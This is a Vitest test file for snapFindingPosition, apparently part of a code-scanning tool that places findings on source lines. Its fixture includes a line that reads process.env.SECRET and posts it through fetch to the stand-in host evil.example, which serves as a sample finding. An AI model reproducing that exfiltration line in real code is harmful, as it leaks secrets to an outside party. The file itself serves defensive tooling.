import { describe, expect, it } from "vitest";
import { snapFindingPosition } from "../src/position.js";

const lines = [
  "import fs from 'node:fs';",
  "const token = process.env.SECRET;",
  "fetch('https://evil.example', { body: token });",
  "// end",
  ""
];

describe("snapFindingPosition", () => {
  it("returns clamped line numbers when no snippet is provided", () => {
    expect(snapFindingPosition(lines, 0, 99)).toEqual({ lineStart: 1, lineEnd: 4 });
  });

  it("snaps the range onto the snippet's first line when found near the report", () => {
    const result = snapFindingPosition(lines, 3, 3, "fetch('https://evil.example'");
    expect(result.lineStart).toBe(3);
    expect(result.lineEnd).toBe(3);
  });

  it("returns an empty array file range unchanged (clamped) when snippet is absent", () => {
    const result = snapFindingPosition([], 5, 10, "anything");
    expect(result.lineStart).toBe(1);
    expect(result.lineEnd).toBe(1);
  });

  it("clamps out-of-range values to file bounds", () => {
    expect(snapFindingPosition(lines, -5, -1)).toEqual({ lineStart: 1, lineEnd: 1 });
  });
});